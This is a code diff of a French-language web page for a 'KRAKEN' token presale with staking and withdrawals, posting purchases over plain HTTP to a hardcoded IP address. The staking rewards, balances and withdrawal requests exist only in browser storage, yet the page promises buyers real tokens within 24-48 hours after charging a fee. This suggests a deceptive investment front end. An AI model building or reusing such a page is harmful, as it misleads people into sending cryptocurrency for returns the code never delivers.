-        document.getElementById('connectWallet').textContent = `${connectedWallet.slice(0,4)}...${connectedWallet.slice(-4)}`;
-        document.getElementById('connectWallet').classList.add('bg-green-600');
-        
-        await loadUserData();
-      } catch (err) {
-        console.error('Erreur:', err);
-        alert('Erreur connexion wallet');
-      }
-    });
+        // Charger les données au démarrage
+        async function loadUserData() {
+            const provider = getProvider();
+            if (provider) {
+                try {
+                    const resp = await provider.connect({ onlyIfTrusted: true });
+                    if (resp.publicKey) {
+                        connectedWallet = resp.publicKey.toString();
+                        walletProvider = provider;
+                        document.getElementById('walletBtn').textContent = '✅ Wallet connecté';
+                        document.getElementById('walletBtn').classList.add('connected');
+                        document.getElementById('walletBtn').onclick = disconnectWallet;
+                        document.getElementById('connectedAddress').textContent = connectedWallet;
+                        document.getElementById('walletInfo').style.display = 'block';
+                        document.getElementById('withdrawAddress').value = connectedWallet;
+                        await loadUserDataForWallet(connectedWallet);
+                    }
+                } catch (err) {
+                    console.log('Connexion automatique non autorisée');
+                }
+            }
+            if (!connectedWallet) {
+                try {
+                    const result = await window.storage.get('kraken_user_data');
+                    if (result && result.value) {
+                        userData = JSON.parse(result.value);
+                        updateBalances();
+                        renderActiveStakes();
+                        renderWithdrawHistory();
+                    }
+                } catch (error) {
+                    console.log('Pas de données utilisateur existantes');
+                }
+            }
+        }
 
-    // Charger données user
-    async function loadUserData() {
-      try {
-        const res = await fetch(`${API_URL}/api/user/${connectedWallet}`);
-        const data = await res.json();
-        
-        document.getElementById('userBalance').classList.remove('hidden');
-        document.getElementById('totalBalance').textContent = (parseFloat(data.user.virtual_balance) + parseFloat(data.user.staked_balance)).toLocaleString();
-        document.getElementById('stakedBalance').textContent = parseFloat(data.user.staked_balance).toLocaleString();
-        document.getElementById('availableBalance').textContent = parseFloat(data.user.virtual_balance).toLocaleString();
-      } catch (err) {
-        console.error('Erreur user:', err);
-      }
-    }
+        // Récupérer les stats depuis le backend
+        async function fetchPresaleStats() {
+            try {
+                const response = await fetch('http://158.178.197.42:3000/api/stats');
+                const data = await response.json();
+                tokensSold = data.totalSold;
+                document.getElementById('tokensSold').textContent = tokensSold.toLocaleString('fr-FR');
+                document.getElementById('progressPercent').textContent = data.progress.toFixed(2) + '%';
+                document.getElementById('progressFill').style.width = data.progress + '%';
+            } catch (error) {
+                console.error("Erreur lors de la récupération des stats:", error);
+                alert("Impossible de charger les données de la presale. Vérifie ta connexion.");
+            }
+        }
 
-    // Démarrer
-    loadStats();
-    setInterval(loadStats, 30000); // Refresh toutes les 30s
-  </script>
+        // Acheter des tokens
+        async function buyTokens() {
+            const amount = parseFloat(document.getElementById('amountInput').value) || 0;
+            if (!connectedWallet) {
+                alert('❌ Connecte d\'abord ton wallet Solana !');
+                return;
+            }
+            if (amount <= 0) {
+                alert('❌ Montant invalide');
+                return;
+            }
+            try {
+                const response = await fetch('http://158.178.197.42:3000/api/buy', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        wallet: connectedWallet,
+                        amount: amount,
+                        network: currentNetwork
+                    })
+                });
+                const result = await response.json();
+                if (result.success) {
+                    alert(`✅ Achat enregistré! Tu recevras ${result.tokensReceived.toLocaleString('fr-FR')} KRAKEN après vérification.`);
+                    userData.virtualBalance += result.tokensReceived;
+                    saveUserData();
+                    updateBalances();
+                    fetchPresaleStats();
+                } else {
+                    alert(`❌ Erreur: ${result.message}`);
+                }
+            } catch (error) {
+                console.error("Erreur lors de l'achat:", error);
+                alert("Impossible de finaliser l'achat. Vérifie ta connexion.");
+            }
+        }
+
+        // Sélectionner un plan de staking
+        function selectStakingPlan(days, apy) {
+            selectedStakingDays = days;
+            selectedStakingAPY = apy;
+            document.querySelectorAll('.staking-card').forEach(card => {
+                card.classList.remove('selected');
+            });
+            event.target.closest('.staking-card').classList.add('selected');
+            document.getElementById('selectedPlan').textContent = `${days} jours — ${apy}% APY`;
+            document.getElementById('stakeBtn').disabled = false;
+            calculateStakingRewards();
+        }
+
+        // Calculer les récompenses de staking
+        function calculateStakingRewards() {
+            const amount = parseFloat(document.getElementById('stakeAmount').value) || 0;
+            if (amount > 0 && selectedStakingAPY > 0) {
+                const rewards = amount * (selectedStakingAPY / 100);
+                document.getElementById('stakingRewards').textContent =
+                    rewards.toLocaleString('fr-FR', { maximumFractionDigits: 2 });
+            } else {
+                document.getElementById('stakingRewards').textContent = '0';
+            }
+        }
+
+        // Staker des tokens
+        async function stakeTokens() {
+            const amount = parseFloat(document.getElementById('stakeAmount').value) || 0;
+            const available = userData.virtualBalance - userData.stakedBalance;
+            if (amount <= 0) {
+                alert('❌ Montant invalide');
+                return;
+            }
+            if (amount > available) {
+                alert('❌ Solde insuffisant. Disponible: ' + available.toLocaleString('fr-FR'));
+                return;
+            }
+            if (selectedStakingDays === 0) {
+                alert('❌ Sélectionne un plan de staking');
+                return;
+            }
+            const rewards = amount * (selectedStakingAPY / 100);
+            const endDate = new Date();
+            endDate.setDate(endDate.getDate() + selectedStakingDays);
+            userData.stakes.push({
+                id: Date.now(),
+                amount: amount,
+                rewards: rewards,
+                apy: selectedStakingAPY,
+                days: selectedStakingDays,
+                startDate: new Date().toISOString(),
+                endDate: endDate.toISOString(),
+                status: 'active'
+            });
+            userData.stakedBalance += amount;
+            await saveUserData();
+            updateBalances();
+            renderActiveStakes();
+            document.getElementById('stakeAmount').value = '';
+            document.getElementById('stakingRewards').textContent = '0';
+            alert(`✅ Stake créé avec succès!\n${amount.toLocaleString('fr-FR')} KRAKEN stakés pour ${selectedStakingDays} jours\n+${rewards.toLocaleString('fr-FR')} KRAKEN de récompenses`);
+        }
+
+        // Afficher les stakes actifs
+        function renderActiveStakes() {
+            const container = document.getElementById('activeStakes');
+            if (userData.stakes.length === 0) {
+                container.innerHTML = '<p style="color: #a0a0a0; text-align: center; padding: 20px;">Aucun stake actif pour le moment</p>';
+                return;
+            }
+            let html = '';
+            userData.stakes.forEach(stake => {
+                const now = new Date();
+                const start = new Date(stake.startDate);
+                const end = new Date(stake.endDate);
+                const totalDuration = end - start;
+                const elapsed = now - start;
+                const progress = Math.min(100, (elapsed / totalDuration) * 100);
+                const daysLeft = Math.max(0, Math.ceil((end - now) / (1000 * 60 * 60 * 24)));
+                html += `
+                    <div class="stake-item">
+                        <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
+                            <div>
+                                <div style="color: #ff1493; font-weight: bold; font-size: 1.2rem;">
+                                    ${stake.amount.toLocaleString('fr-FR')} KRAKEN
+                                </div>
+                                <div style="color: #a0a0a0; font-size: 0.8rem;">
+                                    ${stake.apy}% APR — ${stake.days} jours
+                                </div>
+                            </div>
+                            <div style="text-align: right;">
+                                <div style="color: #8a2be2; font-weight: bold;">
+                                    +${stake.rewards.toLocaleString('fr-FR', { maximumFractionDigits: 2 })}
+                                </div>
+                                <div style="color: #a0a0a0; font-size: 0.8rem;">
+                                    Récompenses
+                                </div>
+                            </div>
+                        </div>
+                        <div style="color: #a0a0a0; font-size: 0.85rem; margin-bottom: 5px;">
+                            ${daysLeft > 0 ? `⏱️ ${daysLeft} jours restants` : '✅ Terminé'}
+                        </div>
+                        <div class="stake-progress">
+                            <div class="stake-progress-fill" style="width: ${progress}%"></div>
+                        </div>
+                        ${daysLeft === 0 ? `
+                            <button onclick="unstake(${stake.id})" style="width: 100%; margin-top: 10px; padding: 10px; background: linear-gradient(135deg, #8a2be2, #ff1493); border: none; border-radius: 10px; color: #fff; font-family: 'Orbitron'; cursor: pointer;">
+                                🔓 Récupérer + récompenses
+                            </button>
+                        ` : ''}
+                    </div>
+                `;
+            });
+            container.innerHTML = html;
+        }
+
+        // Unstake
+        async function unstake(stakeId) {
+            const stakeIndex = userData.stakes.findIndex(s => s.id === stakeId);
+            if (stakeIndex === -1) return;
+            const stake = userData.stakes[stakeIndex];
+            const total = stake.amount + stake.rewards;
+            userData.virtualBalance += total;
+            userData.stakedBalance -= stake.amount;
+            userData.stakes.splice(stakeIndex, 1);
+            await saveUserData();
+            updateBalances();
+            renderActiveStakes();
+            alert(`✅ Stake récupéré!\nTu as reçu ${total.toLocaleString('fr-FR')} KRAKEN (capital + récompenses)`);
+        }
+
+        // Mettre à jour les balances
+        function updateBalances() {
+            document.getElementById('virtualBalance').textContent =
+                userData.virtualBalance.toLocaleString('fr-FR', { maximumFractionDigits: 0 });
+            document.getElementById('stakedBalance').textContent =
+                userData.stakedBalance.toLocaleString('fr-FR', { maximumFractionDigits: 0 });
+            document.getElementById('availableBalance').textContent =
+                (userData.virtualBalance - userData.stakedBalance).toLocaleString('fr-FR', { maximumFractionDigits: 0 });
+        }
+
+        // Demander un retrait
+        async function requestWithdrawal() {
+            const address = document.getElementById('withdrawAddress').value.trim();
+            const amount = parseFloat(document.getElementById('withdrawAmount').value) || 0;
+            const available = userData.virtualBalance - userData.stakedBalance;
+            const minWithdraw = 1000;
+            const fee = Math.max(100, amount * 0.02);
+            if (!address) {
+                alert('❌ Entre ton adresse Solana');
+                return;
+            }
+            if (amount < minWithdraw) {
+                alert(`❌ Minimum de retrait: ${minWithdraw.toLocaleString('fr-FR')} KRAKEN`);
+                return;
+            }
+            if (amount > available) {
+                alert(`❌ Solde insuffisant. Disponible: ${available.toLocaleString('fr-FR')} KRAKEN`);
+                return;
+            }
+            const netAmount = amount - fee;
+            const confirmed = confirm(
+                `🔄 Confirmer le retrait?\n\n` +
+                `Montant: ${amount.toLocaleString('fr-FR')} KRAKEN\n` +
+                `Frais (2%): ${fee.toLocaleString('fr-FR')} KRAKEN\n` +
+                `Tu recevras: ${netAmount.toLocaleString('fr-FR')} KRAKEN\n\n` +
+                `Adresse: ${address}\n\n` +
+                `⏱️ Délai: 24-48h`
+            );
+            if (!confirmed) return;
+            userData.virtualBalance -= amount;
+            userData.withdrawals.push({
+                id: Date.now(),
+                amount: netAmount,
+                fee: fee,
+                address: address,
+                date: new Date().toISOString(),
+                status: 'pending'
+            });
+            await saveUserData();
+            updateBalances();
+            renderWithdrawHistory();
+            document.getElementById('withdrawAddress').value = '';
+            document.getElementById('withdrawAmount').value = '';
+            alert('✅ Demande de retrait enregistrée!\nTu recevras tes tokens réels sous 24-48h.');
+        }
+
+        // Afficher l'historique des retraits
+        function renderWithdrawHistory() {
+            const container = document.getElementById('withdrawHistory');
+            if (userData.withdrawals.length === 0) {
+                container.innerHTML = '<p style="color: #a0a0a0; text-align: center; padding: 20px;">Aucun retrait demandé</p>';
+                return;
+            }
+            let html = '';
+            userData.withdrawals.slice().reverse().forEach(withdraw => {
+                const date = new Date(withdraw.date);
+                const statusClass = withdraw.status === 'completed' ? 'completed' : 'pending';
+                const statusText = withdraw.status === 'completed' ? '✅ Complété' : '⏳ En cours';
+                html += `
+                    <div class="withdraw-item">
+                        <div>
+                            <div style="color: #ff1493; font-weight: bold;">
+                                ${withdraw.amount.toLocaleString('fr-FR')} KRAKEN
+                            </div>
+                            <div style="color: #a0a0a0; font-size: 0.8rem;">
+                                ${date.toLocaleDateString('fr-FR')} ${date.toLocaleTimeString('fr-FR')}
+                            </div>
+                            <div style="color: #666; font-size: 0.75rem; margin-top: 5px;">
+                                ${withdraw.address.substring(0, 8)}...${withdraw.address.substring(withdraw.address.length - 8)}
+                            </div>
+                        </div>
+                        <div class="withdraw-status ${statusClass}">
+                            ${statusText}
+                        </div>
+                    </div>
+                `;
+            });
+            container.innerHTML = html;
+        }
+
+        // Calculer le prix actuel
+        function getCurrentPrice() {
+            for (let phase of PHASES) {
+                if (tokensSold < phase.max) {
+                    return phase.price;
+                }
+            }
+            return PHASES[PHASES.length - 1].price;
+        }
+
+        // Calculer les tokens reçus
+        function calculateTokens() {
+            const amount = parseFloat(document.getElementById('amountInput').value) || 0;
+            const currentPrice = getCurrentPrice();
+            const tokens = amount / currentPrice;
+            document.getElementById('tokensReceived').textContent =
+                tokens.toLocaleString('fr-FR', { maximumFractionDigits: 0 });
+        }
+
+        // Sélectionner le réseau
+        function selectNetwork(network) {
+            currentNetwork = network;
+            document.getElementById('solBtn').classList.remove('active');
+            document.getElementById('ethBtn').classList.remove('active');
+            if (network === 'solana') {
+                document.getElementById('solBtn').classList.add('active');
+                document.getElementById('walletAddress').innerHTML = `
+                    📬 Adresse de paiement Solana :<br>
+                    <strong>${SOLANA_ADDRESS}</strong>
+                `;
+            } else {
+                document.getElementById('ethBtn').classList.add('active');
+                document.getElementById('walletAddress').innerHTML = `
+                    📬 Adresse de paiement Ethereum :<br>
+                    <strong>${ETH_ADDRESS}</strong>
+                `;
+            }
+            calculateTokens();
+        }
+
+        // Initialiser
+        loadUserData();
+        fetchPresaleStats();
+    </script>
 </body>
 </html>
